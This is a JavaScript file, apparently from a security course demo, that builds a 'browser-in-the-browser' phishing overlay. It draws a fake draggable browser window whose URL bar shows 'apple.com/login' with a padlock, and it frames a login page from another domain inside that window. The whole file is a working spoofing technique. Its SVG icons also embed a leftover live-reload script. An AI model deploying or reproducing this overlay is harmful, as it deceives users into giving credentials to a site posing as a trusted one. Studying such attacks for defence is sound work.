



const head = `<meta charset=utf-8>
<meta name=viewport content="width=device-width, initial-scale=1">
<style>@font-face{font-family:system;font-style:normal;font-weight:300;src:local(".SFNSText-Light"),local(".HelveticaNeueDeskInterface-Light"),local("Roboto-Light"),local("DroidSans"),local("Tahoma"),local(".LucidaGrandeUI"),local("Ubuntu Light"),local("Segoe UI Light")}html,body{width:100%;height:100%}#title-bar{height:31px;background-color:black;width:100%;display:flex;justify-content:space-between;user-select:none}#logo{padding-left:5px;vertical-align:middle}#logo-description{color:white;font-size:12px;font-family:"system";vertical-align:middle}#minimize{color:white;font-size:12px;padding:9px 15px 7px 15px}#square{color:white;font-size:22px;padding:0px 15px 5px 15px}#exit{color:white;font-size:15px;padding:7px 17px 7px 17px}#url-bar{height:28px;background-color:#1b1a1a;width:100%;display:flex;align-items:center;white-space:nowrap;overflow:scroll;text-overflow:ellipsis;-ms-overflow-style:none;scrollbar-width:none}#url-bar::-webkit-scrollbar{display:none}#ssl-padlock{user-select:none;padding-left:8px;margin-right:8px}#domain-name{color:white;font-size:14px;font-family:"system"}#domain-path{color:#9c9898;font-size:14px;font-family:"system"}#title-bar-width{width:calc(100% + 2px)}#content{width:100%;height:700px;border:1px solid gray}#window{position: relative;
	left: 208px;
	top: -330px;color:transparent;background-color:white;border-color:transparent;box-shadow:rgba(0,0,0,0.35) 0px 5px 15px;height:759px;width:40%}</style>
<link type=image/x-icon rel="shortcut icon" href="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">`;
const body = `
 
 <div id=title-bar-width>
 <div id=title-bar>
 <div style=margin-top:5px>
 <img src=data:image/svg+xml;base64,PHN2ZyBlbmFibGUtYmFja2dyb3VuZD0ibmV3IDAgMCAyNDk5LjYgMjUwMCIgdmlld0JveD0iMCAwIDI0OTkuNiAyNTAwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Im0xMTg3LjkgMTE4Ny45aC0xMTg3Ljl2LTExODcuOWgxMTg3Ljl6IiBmaWxsPSIjZjE1MTFiIi8+PHBhdGggZD0ibTI0OTkuNiAxMTg3LjloLTExODh2LTExODcuOWgxMTg3Ljl2MTE4Ny45eiIgZmlsbD0iIzgwY2MyOCIvPjxwYXRoIGQ9Im0xMTg3LjkgMjUwMGgtMTE4Ny45di0xMTg3LjloMTE4Ny45eiIgZmlsbD0iIzAwYWRlZiIvPjxwYXRoIGQ9Im0yNDk5LjYgMjUwMGgtMTE4OHYtMTE4Ny45aDExODcuOXYxMTg3Ljl6IiBmaWxsPSIjZmJiYzA5Ii8+PCEtLSBDb2RlIGluamVjdGVkIGJ5IGxpdmUtc2VydmVyIC0tPgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CgkvLyA8IVtDREFUQVsgIDwtLSBGb3IgU1ZHIHN1cHBvcnQKCWlmICgnV2ViU29ja2V0JyBpbiB3aW5kb3cpIHsKCQkoZnVuY3Rpb24gKCkgewoJCQlmdW5jdGlvbiByZWZyZXNoQ1NTKCkgewoJCQkJdmFyIHNoZWV0cyA9IFtdLnNsaWNlLmNhbGwoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImxpbmsiKSk7CgkJCQl2YXIgaGVhZCA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJoZWFkIilbMF07CgkJCQlmb3IgKHZhciBpID0gMDsgaSA8IHNoZWV0cy5sZW5ndGg7ICsraSkgewoJCQkJCXZhciBlbGVtID0gc2hlZXRzW2ldOwoJCQkJCXZhciBwYXJlbnQgPSBlbGVtLnBhcmVudEVsZW1lbnQgfHwgaGVhZDsKCQkJCQlwYXJlbnQucmVtb3ZlQ2hpbGQoZWxlbSk7CgkJCQkJdmFyIHJlbCA9IGVsZW0ucmVsOwoJCQkJCWlmIChlbGVtLmhyZWYgJiYgdHlwZW9mIHJlbCAhPSAic3RyaW5nIiB8fCByZWwubGVuZ3RoID09IDAgfHwgcmVsLnRvTG93ZXJDYXNlKCkgPT0gInN0eWxlc2hlZXQiKSB7CgkJCQkJCXZhciB1cmwgPSBlbGVtLmhyZWYucmVwbGFjZSgvKCZ8XD8pX2NhY2hlT3ZlcnJpZGU9XGQrLywgJycpOwoJCQkJCQllbGVtLmhyZWYgPSB1cmwgKyAodXJsLmluZGV4T2YoJz8nKSA+PSAwID8gJyYnIDogJz8nKSArICdfY2FjaGVPdmVycmlkZT0nICsgKG5ldyBEYXRlKCkudmFsdWVPZigpKTsKCQkJCQl9CgkJCQkJcGFyZW50LmFwcGVuZENoaWxkKGVsZW0pOwoJCQkJfQoJCQl9CgkJCXZhciBwcm90b2NvbCA9IHdpbmRvdy5sb2NhdGlvbi5wcm90b2NvbCA9PT0gJ2h0dHA6JyA/ICd3czovLycgOiAnd3NzOi8vJzsKCQkJdmFyIGFkZHJlc3MgPSBwcm90b2NvbCArIHdpbmRvdy5sb2NhdGlvbi5ob3N0ICsgd2luZG93LmxvY2F0aW9uLnBhdGhuYW1lICsgJy93cyc7CgkJCXZhciBzb2NrZXQgPSBuZXcgV2ViU29ja2V0KGFkZHJlc3MpOwoJCQlzb2NrZXQub25tZXNzYWdlID0gZnVuY3Rpb24gKG1zZykgewoJCQkJaWYgKG1zZy5kYXRhID09ICdyZWxvYWQnKSB3aW5kb3cubG9jYXRpb24ucmVsb2FkKCk7CgkJCQllbHNlIGlmIChtc2cuZGF0YSA9PSAncmVmcmVzaGNzcycpIHJlZnJlc2hDU1MoKTsKCQkJfTsKCQkJaWYgKHNlc3Npb25TdG9yYWdlICYmICFzZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdJc1RoaXNGaXJzdFRpbWVfTG9nX0Zyb21fTGl2ZVNlcnZlcicpKSB7CgkJCQljb25zb2xlLmxvZygnTGl2ZSByZWxvYWQgZW5hYmxlZC4nKTsKCQkJCXNlc3Npb25TdG9yYWdlLnNldEl0ZW0oJ0lzVGhpc0ZpcnN0VGltZV9Mb2dfRnJvbV9MaXZlU2VydmVyJywgdHJ1ZSk7CgkJCX0KCQl9KSgpOwoJfQoJZWxzZSB7CgkJY29uc29sZS5lcnJvcignVXBncmFkZSB5b3VyIGJyb3dzZXIuIFRoaXMgQnJvd3NlciBpcyBOT1Qgc3VwcG9ydGVkIFdlYlNvY2tldCBmb3IgTGl2ZS1SZWxvYWRpbmcuJyk7Cgl9CgkvLyBdXT4KPC9zY3JpcHQ+PC9zdmc+ id=logo width=20px height=15px>
 <span id=logo-description>Totally Legit Login</span>
 </div>
 <div>
 <span id=minimize>—</span>
 <span id=square>□</span>
 <span id=exit>✕</span>
 </div>
 </div>
 <div id=url-bar>
 <img src=data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iNzUycHQiIGhlaWdodD0iNzUycHQiIHZlcnNpb249IjEuMSIgdmlld0JveD0iMCAwIDc1MiA3NTIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiA8cGF0aCBkPSJtNTEwLjk3IDMxNi44aC0xMi43ODVsLTAuMDAzOTA2LTYyLjUxMmMwLTU2LjgyOC00Ni40MS0xMDMuMjQtMTAzLjI0LTEwMy4yNGgtMzcuODg3Yy01Ni44MjggMC0xMDMuMjQgNDYuNDEtMTAzLjI0IDEwMy4yNHY2Mi4wMzloLTEyLjc4NWMtMjUuNTc0IDAtNDUuOTM4IDIwLjgzNi00NS45MzggNDUuOTM4djE5Mi4yN2MwIDI1LjU3NCAyMC44MzYgNDUuOTM4IDQ1LjkzOCA0NS45MzhoMjcwLjQxYzI1LjU3NCAwIDQ1LjkzOC0yMC44MzYgNDUuOTM4LTQ1LjkzOGwwLjAwMzkwNi0xOTEuOGMwLTI1LjU3NC0yMC44MzYtNDUuOTM4LTQ2LjQxLTQ1LjkzOHptLTE5NS4xMi02Mi41MTJjMC0yMi43MyAxOC40NjktNDEuMjAzIDQxLjIwMy00MS4yMDNoMzcuODg3YzIyLjczIDAgNDEuMjAzIDE4LjQ2OSA0MS4yMDMgNDEuMjAzdjYyLjAzOWgtMTIwLjI5eiIgZmlsbD0iI0E2QTZCMiIvPgo8IS0tIENvZGUgaW5qZWN0ZWQgYnkgbGl2ZS1zZXJ2ZXIgLS0+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KCS8vIDwhW0NEQVRBWyAgPC0tIEZvciBTVkcgc3VwcG9ydAoJaWYgKCdXZWJTb2NrZXQnIGluIHdpbmRvdykgewoJCShmdW5jdGlvbiAoKSB7CgkJCWZ1bmN0aW9uIHJlZnJlc2hDU1MoKSB7CgkJCQl2YXIgc2hlZXRzID0gW10uc2xpY2UuY2FsbChkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgibGluayIpKTsKCQkJCXZhciBoZWFkID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImhlYWQiKVswXTsKCQkJCWZvciAodmFyIGkgPSAwOyBpIDwgc2hlZXRzLmxlbmd0aDsgKytpKSB7CgkJCQkJdmFyIGVsZW0gPSBzaGVldHNbaV07CgkJCQkJdmFyIHBhcmVudCA9IGVsZW0ucGFyZW50RWxlbWVudCB8fCBoZWFkOwoJCQkJCXBhcmVudC5yZW1vdmVDaGlsZChlbGVtKTsKCQkJCQl2YXIgcmVsID0gZWxlbS5yZWw7CgkJCQkJaWYgKGVsZW0uaHJlZiAmJiB0eXBlb2YgcmVsICE9ICJzdHJpbmciIHx8IHJlbC5sZW5ndGggPT0gMCB8fCByZWwudG9Mb3dlckNhc2UoKSA9PSAic3R5bGVzaGVldCIpIHsKCQkJCQkJdmFyIHVybCA9IGVsZW0uaHJlZi5yZXBsYWNlKC8oJnxcPylfY2FjaGVPdmVycmlkZT1cZCsvLCAnJyk7CgkJCQkJCWVsZW0uaHJlZiA9IHVybCArICh1cmwuaW5kZXhPZignPycpID49IDAgPyAnJicgOiAnPycpICsgJ19jYWNoZU92ZXJyaWRlPScgKyAobmV3IERhdGUoKS52YWx1ZU9mKCkpOwoJCQkJCX0KCQkJCQlwYXJlbnQuYXBwZW5kQ2hpbGQoZWxlbSk7CgkJCQl9CgkJCX0KCQkJdmFyIHByb3RvY29sID0gd2luZG93LmxvY2F0aW9uLnByb3RvY29sID09PSAnaHR0cDonID8gJ3dzOi8vJyA6ICd3c3M6Ly8nOwoJCQl2YXIgYWRkcmVzcyA9IHByb3RvY29sICsgd2luZG93LmxvY2F0aW9uLmhvc3QgKyB3aW5kb3cubG9jYXRpb24ucGF0aG5hbWUgKyAnL3dzJzsKCQkJdmFyIHNvY2tldCA9IG5ldyBXZWJTb2NrZXQoYWRkcmVzcyk7CgkJCXNvY2tldC5vbm1lc3NhZ2UgPSBmdW5jdGlvbiAobXNnKSB7CgkJCQlpZiAobXNnLmRhdGEgPT0gJ3JlbG9hZCcpIHdpbmRvdy5sb2NhdGlvbi5yZWxvYWQoKTsKCQkJCWVsc2UgaWYgKG1zZy5kYXRhID09ICdyZWZyZXNoY3NzJykgcmVmcmVzaENTUygpOwoJCQl9OwoJCQlpZiAoc2Vzc2lvblN0b3JhZ2UgJiYgIXNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ0lzVGhpc0ZpcnN0VGltZV9Mb2dfRnJvbV9MaXZlU2VydmVyJykpIHsKCQkJCWNvbnNvbGUubG9nKCdMaXZlIHJlbG9hZCBlbmFibGVkLicpOwoJCQkJc2Vzc2lvblN0b3JhZ2Uuc2V0SXRlbSgnSXNUaGlzRmlyc3RUaW1lX0xvZ19Gcm9tX0xpdmVTZXJ2ZXInLCB0cnVlKTsKCQkJfQoJCX0pKCk7Cgl9CgllbHNlIHsKCQljb25zb2xlLmVycm9yKCdVcGdyYWRlIHlvdXIgYnJvd3Nlci4gVGhpcyBCcm93c2VyIGlzIE5PVCBzdXBwb3J0ZWQgV2ViU29ja2V0IGZvciBMaXZlLVJlbG9hZGluZy4nKTsKCX0KCS8vIF1dPgo8L3NjcmlwdD48L3N2Zz4K id=ssl-padlock width=20px height=20px>
 <span id=domain-name>apple.com</span>
 <span id=domain-path>/login</span>
 </div>
 </div>
 <iframe id="content" src="https://demo.csci3403.com/login" frameBorder="0"></iframe>
	`;
// onload function
var hele = document.createElement("div");

var bele = document.createElement("div");
bele.id = 'window';
bele.innerHTML = body;
hele.innerHTML = head;
document.head.append(hele);

window.onload = (event) => {
    document.body.append(bele);
    var minimize = document.getElementById("minimize");
    var square = document.getElementById("square");
    var exit = document.getElementById("exit");
    var titleBar = document.getElementById("title-bar");

    ////////////////// Hover listeners //////////////////
    minimize.addEventListener('mouseover', function handleMouseOver() {
        minimize.style.backgroundColor = '#272727';
        minimize.style.cursor = 'context-menu';
    });

    minimize.addEventListener('mouseout', function handleMouseOut() {
        minimize.style.backgroundColor = 'black';
        minimize.style.cursor = 'default';
    });

    square.addEventListener('mouseover', function handleMouseOver() {
        square.style.backgroundColor = '#272727';
        square.style.cursor = 'context-menu';
    });

    square.addEventListener('mouseout', function handleMouseOut() {
        square.style.backgroundColor = 'black';
        square.style.cursor = 'default';
    });

    exit.addEventListener('mouseover', function handleMouseOver() {
        exit.style.backgroundColor = 'red';
        exit.style.cursor = 'context-menu';
    });

    exit.addEventListener('mouseout', function handleMouseOut() {
        exit.style.backgroundColor = 'black';
        exit.style.cursor = 'default';
    });

    titleBar.addEventListener('mouseover', function handleMouseOver() {
        titleBar.style.cursor = 'context-menu';
    });

    titleBar.addEventListener('mouseout', function handleMouseOver() {
        titleBar.style.cursor = 'default';
    });


    //////////////// Make window draggable start ////////////////
    // Make the DIV element draggable:
    var draggable = $('#window');
    var title = $('#title-bar');

    title.on('mousedown', function (e) {
        var dr = $(draggable).addClass("drag");
        height = dr.outerHeight();
        width = dr.outerWidth();
        ypos = dr.offset().top + height - e.pageY,
            xpos = dr.offset().left + width - e.pageX;
        $(document.body).on('mousemove', function (e) {
            var itop = e.pageY + ypos - height;
            var ileft = e.pageX + xpos - width;
            if (dr.hasClass("drag")) {
                dr.offset({ top: itop, left: ileft });
            }
        }).on('mouseup', function (e) {
            dr.removeClass("drag");
        });
    });
    //////////////// Make window draggable end ////////////////


    ////////////////// Onclick listeners //////////////////
    // X button functionality
    $("#exit").click(function () {
        $("#window").css("display", "none");
    });

    // Maximize button functionality
    $("#square").click(enlarge);

    function enlarge() {
        if (square.classList.contains("enlarged")) {
            $("#window").css("width", "40%");
            $("#title-bar-width").css('width', '100%').css('width', '+=2px');
            $("#content").css("width", "100%");
            $("#square").removeClass("enlarged");
        }
        else {
            $("#window").css("width", "70%");
            $("#title-bar-width").css('width', '100%').css('width', '+=2px');
            $("#content").css("width", "100%");
            $("#square").addClass("enlarged");
        }
    }
};

